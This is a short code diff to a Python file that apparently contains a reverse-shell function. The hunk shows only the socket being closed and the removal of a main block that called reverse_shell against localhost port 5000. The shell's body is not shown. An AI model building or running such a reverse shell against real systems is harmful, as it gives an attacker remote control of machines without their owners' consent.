@@ -84,8 +84,3 @@ def reverse_shell(remote_host: str, remote_port: int, buffer_size: int = 1024) -
 
     # close client connection
     s.close()
-
-
-if __name__ == '__main__':
-    # listener(local_host='127.0.0.1', local_port=5000)
-    reverse_shell(remote_host='127.0.0.1', remote_port=5000)
